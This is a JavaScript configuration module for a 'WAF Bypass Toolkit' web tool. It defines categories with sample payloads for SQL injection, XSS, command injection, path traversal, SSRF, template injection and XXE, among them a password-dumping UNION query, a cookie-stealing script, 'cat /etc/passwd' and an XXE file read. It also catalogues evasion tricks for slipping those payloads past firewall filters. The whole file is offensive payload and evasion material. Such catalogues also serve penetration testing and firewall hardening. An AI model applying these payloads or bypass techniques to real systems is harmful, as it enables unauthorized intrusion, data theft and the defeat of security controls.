/**
 * WAF Bypass Toolkit — Categories, Targets & Evasion Layers
 * Defines available vulnerability categories, sub-targets, and evasion techniques.
 */

export const CATEGORIES = [
  {
    id: 'sqli',
    name: 'SQL Injection',
    shortName: 'SQLi',
    icon: '💉',
    color: '#ef4444',
    description: 'Bypass WAF rules for SQL injection payloads',
    placeholder: `' OR 1=1 UNION SELECT username, password FROM users--`,
  },
  {
    id: 'xss',
    name: 'Cross-Site Scripting',
    shortName: 'XSS',
    icon: '🔥',
    color: '#f97316',
    description: 'Evade XSS filters and WAF pattern matching',
    placeholder: `<script>alert(document.cookie)</script>`,
  },
  {
    id: 'cmdi',
    name: 'Command Injection',
    shortName: 'CMDi',
    icon: '⚡',
    color: '#f59e0b',
    description: 'Bypass OS command injection filters',
    placeholder: `; cat /etc/passwd`,
  },
  {
    id: 'lfi',
    name: 'LFI / Path Traversal',
    shortName: 'LFI',
    icon: '📂',
    color: '#10b981',
    description: 'Evade path traversal and LFI detection rules',
    placeholder: `../../../etc/passwd`,
  },
  {
    id: 'ssrf',
    name: 'Server-Side Request Forgery',
    shortName: 'SSRF',
    icon: '🌐',
    color: '#06b6d4',
    description: 'Obfuscate SSRF payloads to bypass URL validation',
    placeholder: `http://127.0.0.1/admin`,
  },
  {
    id: 'ssti',
    name: 'Server-Side Template Injection',
    shortName: 'SSTI',
    icon: '🧩',
    color: '#8b5cf6',
    description: 'Bypass template injection WAF rules',
    placeholder: `{{7*7}}`,
  },
  {
    id: 'xxe',
    name: 'XML External Entity',
    shortName: 'XXE',
    icon: '📜',
    color: '#ec4899',
    description: 'Evade XXE detection via encoding tricks',
    placeholder: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
  },
]

export const TARGETS = {
  sqli: [
    { id: 'mysql', name: 'MySQL' },
    { id: 'postgres', name: 'PostgreSQL' },
    { id: 'mssql', name: 'MSSQL' },
    { id: 'oracle', name: 'Oracle' },
    { id: 'sqlite', name: 'SQLite' },
  ],
  xss: [
    { id: 'html', name: 'HTML Context' },
    { id: 'js', name: 'JS Context' },
    { id: 'attr', name: 'Attribute Context' },
  ],
  cmdi: [
    { id: 'linux', name: 'Linux' },
    { id: 'windows', name: 'Windows' },
  ],
  lfi: [
    { id: 'php', name: 'PHP' },
    { id: 'java', name: 'Java' },
    { id: 'dotnet', name: '.NET' },
    { id: 'generic', name: 'Generic' },
  ],
  ssrf: [
    { id: 'http', name: 'HTTP' },
    { id: 'cloud', name: 'Cloud Metadata' },
  ],
  ssti: [
    { id: 'jinja2', name: 'Jinja2 (Python)' },
    { id: 'twig', name: 'Twig (PHP)' },
    { id: 'freemarker', name: 'Freemarker (Java)' },
  ],
  xxe: [
    { id: 'generic', name: 'Generic XML' },
    { id: 'php', name: 'PHP' },
    { id: 'java', name: 'Java' },
  ],
}

export const EVASION_LAYERS = {
  sqli: [
    {
      id: 'whitespace',
      name: 'Whitespace Bypass',
      icon: '⬜',
      description: 'Replace spaces with /**/, %0a, %09, %0d, +',
    },
    {
      id: 'case-toggle',
      name: 'Case Toggling',
      icon: '🔤',
      description: 'Random upper/lower case per character',
    },
    {
      id: 'inline-comments',
      name: 'Inline Comments',
      icon: '💬',
      description: 'MySQL versioned comments: /*!50000SELECT*/',
    },
    {
      id: 'hex-encoding',
      name: 'Hex Encoding',
      icon: '🔢',
      description: 'Encode strings as 0x hex literals',
    },
    {
      id: 'url-encoding',
      name: 'URL Encoding',
      icon: '🔗',
      description: 'Percent-encode keywords (%55%4e%49%4f%4e)',
    },
    {
      id: 'double-url',
      name: 'Double URL Encoding',
      icon: '🔗🔗',
      description: 'Double encode: %2555%254e%2549%254f%254e',
    },
  ],
  xss: [
    {
      id: 'html-entities',
      name: 'HTML Entity Encoding',
      icon: '🏷️',
      description: 'Convert chars to &#xHH; or &#DDD; entities',
    },
    {
      id: 'url-encoding',
      name: 'URL Encoding',
      icon: '🔗',
      description: 'Percent-encode payload (%3Cscript%3E)',
    },
    {
      id: 'js-obfuscation',
      name: 'JS Function Obfuscation',
      icon: '🧬',
      description: "Split functions: window['al'+'ert'](1)",
    },
    {
      id: 'tag-variation',
      name: 'Tag & Event Variation',
      icon: '🏗️',
      description: 'Alternative tags: svg/onload, img/onerror, body/onpageshow',
    },
    {
      id: 'case-toggle',
      name: 'Case Toggling',
      icon: '🔤',
      description: 'Random casing: <ScRiPt>, <SVG/ONLOAD=...>',
    },
    {
      id: 'encoding-mix',
      name: 'Mixed Encoding',
      icon: '🔀',
      description: 'Combine HTML entities + JS Unicode escapes',
    },
  ],
  cmdi: [
    {
      id: 'space-bypass',
      name: 'Space Bypass',
      icon: '⬜',
      description: 'Replace spaces: ${IFS}, {cmd,arg}, <, %09',
    },
    {
      id: 'keyword-bypass',
      name: 'Keyword Bypass',
      icon: '🚫',
      description: "Break blocked words: c''at, c$@at, /e\"t\"c/",
    },
    {
      id: 'newline-bypass',
      name: 'Newline Injection',
      icon: '↩️',
      description: 'Inject %0a or $\'\\n\' to bypass single-line checks',
    },
    {
      id: 'variable-expansion',
      name: 'Variable Expansion',
      icon: '💲',
      description: 'Use ${varname} tricks and brace expansion',
    },
    {
      id: 'hex-cmd',
      name: 'Hex Encoded Commands',
      icon: '🔢',
      description: "Build commands via $(printf '\\xHH')",
    },
  ],
  lfi: [
    {
      id: 'double-url',
      name: 'Double URL Encoding',
      icon: '🔗🔗',
      description: 'Double encode ../ → %252e%252e%252f',
    },
    {
      id: 'unicode-encoding',
      name: 'Unicode / UTF-8 Overlong',
      icon: '🌍',
      description: 'Non-standard: %u002e, ..%c0%af, %e0%80%ae',
    },
    {
      id: 'null-byte',
      name: 'Null Byte Injection',
      icon: '⭕',
      description: 'Append %00 to truncate file extension checks',
    },
    {
      id: 'path-normalization',
      name: 'Path Normalization Tricks',
      icon: '📁',
      description: 'Use ....//....// or ..\\\\/..\\\\/ patterns',
    },
    {
      id: 'wrapper-bypass',
      name: 'PHP Wrapper Bypass',
      icon: '🔧',
      description: 'php://filter/convert.base64-encode/resource=...',
    },
  ],
  ssrf: [
    {
      id: 'ip-decimal',
      name: 'IP Decimal Notation',
      icon: '🔢',
      description: '127.0.0.1 → 2130706433',
    },
    {
      id: 'ip-hex',
      name: 'IP Hex Notation',
      icon: '🔣',
      description: '127.0.0.1 → 0x7f000001',
    },
    {
      id: 'ip-octal',
      name: 'IP Octal Notation',
      icon: '8️⃣',
      description: '127.0.0.1 → 0177.0000.0000.0001',
    },
    {
      id: 'ip-short',
      name: 'IP Short Forms',
      icon: '✂️',
      description: '127.0.0.1 → 127.1, 0/, localhost variants',
    },
    {
      id: 'url-tricks',
      name: 'URL Obfuscation',
      icon: '🔗',
      description: 'Embedded creds, @ trick, URL encoding',
    },
    {
      id: 'dns-redirect',
      name: 'DNS / Redirect Bypass',
      icon: '🌐',
      description: 'Alternate hostnames: [::], 0.0.0.0, short DNS',
    },
  ],
  ssti: [
    {
      id: 'string-concat',
      name: 'String Concatenation',
      icon: '➕',
      description: "Break keywords: self['__cla'+'ss__']",
    },
    {
      id: 'hex-encoding',
      name: 'Hex Encoding',
      icon: '🔢',
      description: 'Hex escape: self[\'\\x5f\\x5fclass\\x5f\\x5f\']',
    },
    {
      id: 'attr-access',
      name: 'Attribute Filter Bypass',
      icon: '🔍',
      description: 'Use |attr() filter: self|attr("__class__")',
    },
    {
      id: 'filter-bypass',
      name: 'Filter / Set Bypass',
      icon: '🛡️',
      description: 'Use {% set %} blocks for indirect access',
    },
  ],
  xxe: [
    {
      id: 'utf16',
      name: 'UTF-16 Encoding',
      icon: '🔤',
      description: 'Re-encode entire XML as UTF-16 to blind WAF',
    },
    {
      id: 'utf7',
      name: 'UTF-7 Encoding',
      icon: '7️⃣',
      description: 'Re-encode to UTF-7 for parser confusion',
    },
    {
      id: 'entity-nesting',
      name: 'Parameter Entity Nesting',
      icon: '🪆',
      description: 'Use nested parameter entities to hide payloads',
    },
    {
      id: 'cdata-wrap',
      name: 'CDATA Wrapping',
      icon: '📦',
      description: 'Wrap sensitive content in CDATA sections',
    },
  ],
}
